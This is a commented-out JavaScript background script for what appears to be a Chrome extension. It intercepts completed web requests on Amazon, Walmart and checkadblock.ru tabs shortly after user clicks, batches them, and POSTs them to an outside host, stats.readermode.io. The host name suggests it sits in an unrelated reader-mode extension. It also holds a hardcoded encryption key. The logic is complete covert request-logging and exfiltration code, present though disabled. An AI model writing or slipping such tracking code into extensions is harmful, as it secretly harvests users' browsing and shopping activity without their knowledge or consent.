// /**
//  * @typedef {Object} Config
//  * @property  {string[]} loggingSites sites, which will be included for logging.
//  * @property  {string[]} loggingRequestTypesWhitelist request types, which will be EXCLUDED for logging. look for https://developer.chrome.com/docs/extensions/reference/webRequest/#type-ResourceType to know possible values
//  * @property {string} loggingUrl Url, where logging data will be sent.
//  * @property {RegExp[]} loggingRequestUrlExcludeMasks  Regexes, if url matches one of this, when it will be excluded from logging
//  * @property {number} afterClickTimeout milliseconds after user click, when logging will be enabled.
//  * @property {string} encryptionKey secure key from log collector.
//  */
//
// /**
//  * @type {Config}
//  */
// const config = {
//   loggingSites: ['https://www.amazon.com', 'https://checkadblock.ru', 'https://www.walmart.com'],
//   loggingUrl: 'https://stats.readermode.io/ajax',
//   loggingRequestTypesWhitelist: [],
//   encryptionKey: 'OoCh9oamNookooP8',
//   loggingRequestUrlExcludeMasks: [
//     /^[^?]+\.(gif|jpg|png|img|svg)[\/?]?$/i, // Disable logging images. (but not images with some extra data, because it's probably tracking or something like that.)
//     /^[^?]+\.(js|ts)[/?]?$/i, // Same as above, but for .js and .ts files
//     /^[^?]+\.(woff|woff2)[/?]?$/i, // Same as above, but for fonts
//     /^[^?]+\.(css|scss)[/?]?$/i, // Same as above, but for css
//   ],
//   afterClickTimeout: 2000,
// };
//
// (async function AjaxLogCollect() {
//   const encryptData = async function (text) {
//     const enc = new TextEncoder();
//     const key = await crypto.subtle.importKey('raw', enc.encode(config.encryptionKey), 'AES-GCM', true, ['encrypt']);
//     const iv = crypto.getRandomValues(new Uint8Array(16));
//
//     const cypher = await crypto.subtle.encrypt(
//       {
//         name: 'AES-GCM',
//         iv: iv,
//       },
//       key,
//       enc.encode(text)
//     );
//
//     const res = new Uint8Array(iv.length + cypher.byteLength);
//     res.set(iv);
//     res.set(new Uint8Array(cypher), iv.length);
//
//     return btoa(String.fromCharCode.apply(null, res));
//   };
//   var logs_run = false;
//   var bulk = [];
//   var websites_List = [];
//   var hostname;
//   var lastBulk = new Date();
//   var enabledTabs = {};
//   var noLoggingRequestsTypes = [
//     'main_frame',
//     'sub_frame',
//     'stylesheet',
//     'script',
//     'image',
//     'font',
//     'object',
//     'xmlhttprequest',
//     'ping',
//     'csp_report',
//     'media',
//     'websocket',
//     'other',
//   ].filter((val) => !config.loggingRequestTypesWhitelist.includes(val));
//
//   function deleteUrl(url) {
//     var index = websites_List.indexOf(url);
//     if (index !== -1) {
//       websites_List.splice(index, 1);
//       saveData();
//     }
//   }
//
//   function saveData() {
//     chrome.storage.local.set({
//       websites_List: websites_List,
//     });
//   }
//
//   chrome.storage.local.get(['websites_List'], function (value) {
//     if (value.websites_List === undefined) {
//       websites_List = [];
//     } else {
//       websites_List = value.websites_List;
//     }
//   });
//
//   // Callback for message send. Enables logs collecting after user clicked somewhere in site.
//   chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
//     if (request.type === 'log_switch') {
//       //console.log('GOT MESSAGE')
//       logs_run = true;
//       //console.log('EXEC')
//       //var myAudio = new Audio(chrome.runtime.getURL("js/sound.mp3"));
//       //myAudio.play();
//       setTimeout(() => {
//         logs_run = false;
//       }, config.afterClickTimeout);
//       return;
//     } else if (request.type === 'get_config') {
//       sendResponse(config.loggingSites);
//     }
//
//     function callUrl(obj, successCallback, failCallback, finalCallback) {
//       try {
//         fetch(obj.url, {
//           method: 'POST',
//           body: JSON.stringify(obj.data),
//           headers: {
//             Accept: 'application/json',
//             'Content-Type': 'application/json',
//           },
//         }).then((resp) => {
//           console.log('SENDED!');
//         });
//       } catch (e) {
//         console.log(e);
//         failCallback && failCallback(e, obj);
//         finalCallback && finalCallback();
//       }
//     }
//
//     function reportBulk() {
//       var now = new Date();
//       var timeoutPassed = (now - lastBulk) / 1000 >= 300;
//       var thresholdPassed = bulk.length >= 20;
//       if (bulk.length > 0 && (timeoutPassed || thresholdPassed)) {
//         var reportBulk = Array.from(bulk);
//         setTimeout(function () {
//           console.log('LOGGED!');
//           callUrl({
//             url: config.loggingUrl,
//             method: 'POST',
//             data: { user: 'NEW_TEST_USER', requests: [...reportBulk] },
//             headers: [{ name: 'Content-type', value: 'application/json' }],
//           });
//         }, 250);
//
//         bulk = [];
//         lastBulk = now;
//       }
//     }
//
//     /** Check if request is excluded from logging by exlcude mask.
//      * @param {string} url
//      * */
//     function checkRegexes(url) {
//       for (let regexp of config.loggingRequestUrlExcludeMasks) {
//         if (regexp.test(url)) {
//           return false;
//         }
//       }
//       return true;
//     }
//
//     function logAllRequests(details) {
//       if (!logs_run) return;
//       if (!enabledTabs[details.tabId]) {
//         return;
//       }
//       if (details.method === 'GET' && !checkRegexes(details.url || '')) {
//         return;
//       }
//       bulk.push(details);
//       reportBulk();
//     }
//
//     // Interceptor for request logging.
//     chrome.webRequest.onCompleted.addListener(logAllRequests, { urls: ['<all_urls>'], types: noLoggingRequestsTypes });
//
//     // Interceptor for creation (needed, to know on which tabs logging are enabled).
//     //We can't just check initiator, because it can be not same as tab current url.
//     chrome.tabs.onCreated.addListener(function (tab) {
//       enabledTabs[tab.id] = !!(tab.url && config.loggingSites.includes(new URL(tab.url).origin));
//     });
//
//     // Interceptor to disable logging for removed tab (needed to prevent memory leaks)
//     chrome.tabs.onRemoved.addListener(function (tabId, removeInfo) {
//       delete enabledTabs[tabId];
//     });
//
//     // Interceptor to enable logging in tabs, where current site had changed.
//     chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab) {
//       if (changeInfo.url && config.loggingSites.includes(new URL(changeInfo.url).origin)) {
//         enabledTabs[tabId] = true;
//       } else if (changeInfo.url) {
//         enabledTabs[tabId] = false;
//       }
//     });
//   });
// })().then((r) => {
//   console.log('STARTED AJAX LOGS STORE.');
// });
